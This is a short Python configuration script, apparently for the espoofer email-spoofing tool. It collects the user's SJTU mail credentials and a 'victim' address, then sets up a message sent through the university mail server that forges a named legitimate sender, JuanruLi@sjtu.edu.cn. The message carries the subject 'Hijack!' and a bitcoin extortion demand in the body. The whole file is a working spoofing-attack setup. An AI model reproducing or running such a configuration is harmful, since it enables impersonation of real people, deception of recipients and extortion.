import getpass

def get_user_inputs():
	print("Please enter the following information:")
	username = input("Your SJTU email address: ").strip()
	victim = input("Target email address: ").strip()
	password = getpass.getpass("Your SJTU email password: ")
	
	if not username.endswith("@sjtu.edu.cn"):
		print("Error: Username must be a valid SJTU email address")
		exit(1)
	if not victim.endswith("@sjtu.edu.cn"):
		print("Error: Victim address must be a valid SJTU email address")
		exit(1)
	return username, victim, password

username, victim, password = get_user_inputs()

config = {
	"attacker_site": b"sjtu.edu.cn",
	"legitimate_site_address": b"JuanruLi@sjtu.edu.cn",
	"victim_address": victim.encode(),
	"case_id": b"client_a3",

	# The following fields are optional
	"server_mode":{
		"recv_mail_server": "", # If no value, espoofer will query the victim_address to get the mail server ip
		"recv_mail_server_port": 25,
		"starttls": False,
	},
	"client_mode": {
		"sending_server": ("mail.sjtu.edu.cn", 587),
		"username": username.encode(),
		"password": password.encode(),
	},

	# Optional. You can leave them empty or customize the email message header or body here
	"subject_header": b"Subject: Hijack!\r\n",
	"to_header": f"To: <{victim}>\r\n".encode(), 
	"body": b"Give me 0.1 bitcoin or I will keep sending these emails", 

	# Optional. Set the raw email message you want to sent. It's usually used for replay attacks
	"raw_email": b"", 
}



